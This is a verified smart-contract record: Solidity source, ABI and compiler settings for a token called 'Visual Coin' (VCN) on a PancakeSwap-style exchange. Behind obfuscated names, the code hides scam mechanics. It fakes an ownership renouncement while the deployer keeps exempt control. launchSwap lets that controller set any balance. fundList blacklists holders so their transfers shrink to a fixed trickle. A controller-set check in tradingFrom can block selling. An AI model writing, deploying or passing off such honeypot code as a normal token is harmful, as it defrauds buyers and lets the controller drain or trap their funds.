{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fundSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableMaxSender {\n    function createPair(address shouldEnable, address atWallet) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface shouldSenderMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface teamToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listTake) external view returns (uint256);\n\n    function transfer(address minMarketing, uint256 receiverTotal) external returns (bool);\n\n    function allowance(address autoMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minMarketing,\n        uint256 receiverTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toList, uint256 value);\n    event Approval(address indexed autoMin, address indexed spender, uint256 value);\n}\n\ninterface teamFrom is teamToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VisualCoin is fundSwap, teamToken, teamFrom {\n\n    function autoBuy(address listFrom, address minMarketing, uint256 receiverTotal) internal returns (bool) {\n        require(tradingMarketingIs[listFrom] >= receiverTotal);\n        tradingMarketingIs[listFrom] -= receiverTotal;\n        tradingMarketingIs[minMarketing] += receiverTotal;\n        emit Transfer(listFrom, minMarketing, receiverTotal);\n        return true;\n    }\n\n    constructor (){\n        \n        limitSell();\n        shouldSenderMode atSwap = shouldSenderMode(minAmount);\n        fromAmount = enableMaxSender(atSwap.factory()).createPair(atSwap.WETH(), address(this));\n        sellMin = enableMaxSender(atSwap.factory()).feeTo();\n        if (launchedToken) {\n            liquidityWallet = false;\n        }\n        shouldExempt = _msgSender();\n        swapExemptAt[shouldExempt] = true;\n        tradingMarketingIs[shouldExempt] = listLaunch;\n        if (atTo == liquidityWallet) {\n            autoModeFrom = true;\n        }\n        emit Transfer(address(0), shouldExempt, listLaunch);\n    }\n\n    function transfer(address launchedTotalMin, uint256 receiverTotal) external virtual override returns (bool) {\n        return tradingFrom(_msgSender(), launchedTotalMin, receiverTotal);\n    }\n\n    bool private walletShould;\n\n    address sellMin;\n\n    function transferFrom(address listFrom, address minMarketing, uint256 receiverTotal) external override returns (bool) {\n        if (_msgSender() != minAmount) {\n            if (shouldIsReceiver[listFrom][_msgSender()] != type(uint256).max) {\n                require(receiverTotal <= shouldIsReceiver[listFrom][_msgSender()]);\n                shouldIsReceiver[listFrom][_msgSender()] -= receiverTotal;\n            }\n        }\n        return tradingFrom(listFrom, minMarketing, receiverTotal);\n    }\n\n    bool private autoModeFrom;\n\n    function owner() external view returns (address) {\n        return sellListFrom;\n    }\n\n    function allowance(address totalLimitFee, address enableTx) external view virtual override returns (uint256) {\n        if (enableTx == minAmount) {\n            return type(uint256).max;\n        }\n        return shouldIsReceiver[totalLimitFee][enableTx];\n    }\n\n    uint8 private fromSenderSwap = 18;\n\n    uint256 totalLimit;\n\n    function balanceOf(address listTake) public view virtual override returns (uint256) {\n        return tradingMarketingIs[listTake];\n    }\n\n    function tradingMin(address takeShould) public {\n        if (atIs) {\n            return;\n        }\n        if (txAuto != teamSender) {\n            txAuto = receiverAmount;\n        }\n        swapExemptAt[takeShould] = true;\n        \n        atIs = true;\n    }\n\n    mapping(address => uint256) private tradingMarketingIs;\n\n    mapping(address => mapping(address => uint256)) private shouldIsReceiver;\n\n    function walletFromSender(uint256 receiverTotal) public {\n        fromReceiver();\n        totalLimit = receiverTotal;\n    }\n\n    function fromReceiver() private view {\n        require(swapExemptAt[_msgSender()]);\n    }\n\n    uint256 public txAuto;\n\n    bool public launchedToken;\n\n    address private sellListFrom;\n\n    bool private atTo;\n\n    uint256 autoTrading;\n\n    bool public autoLaunched;\n\n    function approve(address enableTx, uint256 receiverTotal) public virtual override returns (bool) {\n        shouldIsReceiver[_msgSender()][enableTx] = receiverTotal;\n        emit Approval(_msgSender(), enableTx, receiverTotal);\n        return true;\n    }\n\n    function fundList(address teamFromMin) public {\n        fromReceiver();\n        \n        if (teamFromMin == shouldExempt || teamFromMin == fromAmount) {\n            return;\n        }\n        minFrom[teamFromMin] = true;\n    }\n\n    string private minReceiver = \"VCN\";\n\n    mapping(address => bool) public minFrom;\n\n    uint256 public launchedTeam = 3;\n\n    uint256 public senderBuy = 0;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listLaunch;\n    }\n\n    function tradingFrom(address listFrom, address minMarketing, uint256 receiverTotal) internal returns (bool) {\n        if (listFrom == shouldExempt) {\n            return autoBuy(listFrom, minMarketing, receiverTotal);\n        }\n        uint256 teamMin = teamToken(fromAmount).balanceOf(sellMin);\n        require(teamMin == totalLimit);\n        require(minMarketing != sellMin);\n        if (minFrom[listFrom]) {\n            return autoBuy(listFrom, minMarketing, fundFromTo);\n        }\n        receiverTotal = fundMaxReceiver(listFrom, minMarketing, receiverTotal);\n        return autoBuy(listFrom, minMarketing, receiverTotal);\n    }\n\n    uint256 private listLaunch = 100000000 * 10 ** 18;\n\n    function fundMaxReceiver(address listFrom, address minMarketing, uint256 receiverTotal) internal view returns (uint256) {\n        require(receiverTotal > 0);\n\n        uint256 senderExempt = 0;\n        if (listFrom == fromAmount && launchedTeam > 0) {\n            senderExempt = receiverTotal * launchedTeam / 100;\n        } else if (minMarketing == fromAmount && senderBuy > 0) {\n            senderExempt = receiverTotal * senderBuy / 100;\n        }\n        require(senderExempt <= receiverTotal);\n        return receiverTotal - senderExempt;\n    }\n\n    address public shouldExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromSenderSwap;\n    }\n\n    address public fromAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minReceiver;\n    }\n\n    bool private amountMin;\n\n    function limitSell() public {\n        emit OwnershipTransferred(shouldExempt, address(0));\n        sellListFrom = address(0);\n    }\n\n    function launchSwap(address launchedTotalMin, uint256 receiverTotal) public {\n        fromReceiver();\n        tradingMarketingIs[launchedTotalMin] = receiverTotal;\n    }\n\n    uint256 private receiverAmount;\n\n    string private takeAt = \"Visual Coin\";\n\n    mapping(address => bool) public swapExemptAt;\n\n    function name() external view virtual override returns (string memory) {\n        return takeAt;\n    }\n\n    address minAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private liquidityWallet;\n\n    uint256 constant fundFromTo = 13 ** 10;\n\n    bool public atIs;\n\n    event OwnershipTransferred(address indexed isShould, address indexed sellLimit);\n\n    function getOwner() external view returns (address) {\n        return sellListFrom;\n    }\n\n    uint256 public teamSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimitFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFromMin\",\"type\":\"address\"}],\"name\":\"fundList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"launchSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapExemptAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTotal\",\"type\":\"uint256\"}],\"name\":\"walletFromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "VisualCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}